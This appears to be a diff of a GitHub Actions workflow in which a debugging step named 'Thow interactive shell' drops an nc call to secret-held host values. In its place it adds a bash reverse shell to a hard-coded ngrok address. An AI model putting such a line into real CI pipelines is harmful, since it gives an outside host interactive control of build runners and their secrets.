@@ -12,6 +12,6 @@ jobs:
       # Rest of my workflow steps
 
       - name: Thow interactive shell
-        shell: bash -i {0}
+        shell: bash
         run: |
-                nc ${{ secrets.DEBUG_HOST }} ${{ secrets.DEBUG_PORT }}
+              bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1
